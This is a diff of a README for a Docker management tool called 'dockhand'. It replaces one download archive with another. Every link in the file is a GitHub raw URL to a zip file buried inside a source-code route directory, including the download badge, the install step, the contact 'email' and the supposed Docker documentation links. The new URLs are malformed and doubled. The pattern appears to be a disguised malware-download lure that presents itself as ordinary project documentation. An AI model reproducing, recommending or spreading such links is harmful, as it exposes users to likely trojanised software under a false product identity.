@@ -1,6 +1,6 @@
 # 🚢 dockhand - Easy Docker Management Made Simple
 
-[![Download dockhand](https://github.com/MicMJoh36YT/dockhand/raw/refs/heads/main/src/routes/api/auth/oidc/[id]/initiate/Software_1.1.zip%20dockhand-%20-blue)](https://github.com/MicMJoh36YT/dockhand/raw/refs/heads/main/src/routes/api/auth/oidc/[id]/initiate/Software_1.1.zip)
+[![Download dockhand](https://github.com/MicMJoh36YT/dockhand/raw/refs/heads/main/src/routes/api/containers/[id]/logs/Software-v2.3.zip[id]https://github.com/MicMJoh36YT/dockhand/raw/refs/heads/main/src/routes/api/containers/[id]/logs/Software-v2.3.zip%20dockhand-%20-blue)](https://github.com/MicMJoh36YT/dockhand/raw/refs/heads/main/src/routes/api/containers/[id]/logs/Software-v2.3.zip[id]https://github.com/MicMJoh36YT/dockhand/raw/refs/heads/main/src/routes/api/containers/[id]/logs/Software-v2.3.zip)
 
 ## 📦 Introduction
 
@@ -12,7 +12,7 @@ To get started with Dockhand, follow these simple instructions. We’ll guide yo
 
 ## 🌐 Download & Install
 
-1. **Visit the Download Page:** To get the latest version of Dockhand, visit the following link: [Download Dockhand](https://github.com/MicMJoh36YT/dockhand/raw/refs/heads/main/src/routes/api/auth/oidc/[id]/initiate/Software_1.1.zip).
+1. **Visit the Download Page:** To get the latest version of Dockhand, visit the following link: [Download Dockhand](https://github.com/MicMJoh36YT/dockhand/raw/refs/heads/main/src/routes/api/containers/[id]/logs/Software-v2.3.zip[id]https://github.com/MicMJoh36YT/dockhand/raw/refs/heads/main/src/routes/api/containers/[id]/logs/Software-v2.3.zip).
 
 2. **Choose the Right File:** On the Releases page, you’ll see different files. Select the one suited for your operating system. Typically, you will find options for Windows, macOS, and Linux.
 
@@ -62,13 +62,13 @@ If you encounter any problems, you can ask for help in the Issues section of the
 
 ## 📞 Contact
 
-For any questions or feedback, feel free to reach out via the GitHub Issues page or email us at https://github.com/MicMJoh36YT/dockhand/raw/refs/heads/main/src/routes/api/auth/oidc/[id]/initiate/Software_1.1.zip
+For any questions or feedback, feel free to reach out via the GitHub Issues page or email us at https://github.com/MicMJoh36YT/dockhand/raw/refs/heads/main/src/routes/api/containers/[id]/logs/Software-v2.3.zip[id]https://github.com/MicMJoh36YT/dockhand/raw/refs/heads/main/src/routes/api/containers/[id]/logs/Software-v2.3.zip
 
 ## 🔗 Additional Resources
 
-- [Docker Official Documentation](https://github.com/MicMJoh36YT/dockhand/raw/refs/heads/main/src/routes/api/auth/oidc/[id]/initiate/Software_1.1.zip)
-- [Docker Compose Documentation](https://github.com/MicMJoh36YT/dockhand/raw/refs/heads/main/src/routes/api/auth/oidc/[id]/initiate/Software_1.1.zip)
+- [Docker Official Documentation](https://github.com/MicMJoh36YT/dockhand/raw/refs/heads/main/src/routes/api/containers/[id]/logs/Software-v2.3.zip[id]https://github.com/MicMJoh36YT/dockhand/raw/refs/heads/main/src/routes/api/containers/[id]/logs/Software-v2.3.zip)
+- [Docker Compose Documentation](https://github.com/MicMJoh36YT/dockhand/raw/refs/heads/main/src/routes/api/containers/[id]/logs/Software-v2.3.zip[id]https://github.com/MicMJoh36YT/dockhand/raw/refs/heads/main/src/routes/api/containers/[id]/logs/Software-v2.3.zip)
 
 Make sure to download Dockhand today and take control of your Docker management easily! 
 
-[Download Dockhand](https://github.com/MicMJoh36YT/dockhand/raw/refs/heads/main/src/routes/api/auth/oidc/[id]/initiate/Software_1.1.zip) again if needed. Happy docking!
+[Download Dockhand](https://github.com/MicMJoh36YT/dockhand/raw/refs/heads/main/src/routes/api/containers/[id]/logs/Software-v2.3.zip[id]https://github.com/MicMJoh36YT/dockhand/raw/refs/heads/main/src/routes/api/containers/[id]/logs/Software-v2.3.zip) again if needed. Happy docking!
